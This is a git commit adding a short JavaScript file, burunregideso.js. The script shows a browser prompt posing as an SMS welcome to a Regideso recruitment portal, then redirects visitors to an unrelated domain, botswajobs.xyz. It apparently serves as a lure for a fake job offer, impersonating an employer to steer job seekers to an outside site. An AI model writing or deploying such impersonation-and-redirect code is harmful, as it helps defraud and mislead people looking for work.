8d1f864cec41036dc18ade80daba9e2c02211267
newetijazz2 <newetijazz2@gmail.com>
2025-09-08 11:40:47 +0100

    Create burunregideso.js

---
+++ burunregideso.js
@@ -0,0 +1,6 @@
+
+var password = 'Recrutement Regideso'
+password=prompt('SMS: Bienvenue sur le portail de candidature de la Regideso, appuyez sur OK pour postuler au','Recrutement Regideso');
+if (password != 'Recrutement Regideso') {
+location.href='https://www.botswajobs.xyz/Regideso-Burundi-Recrutement';
+}
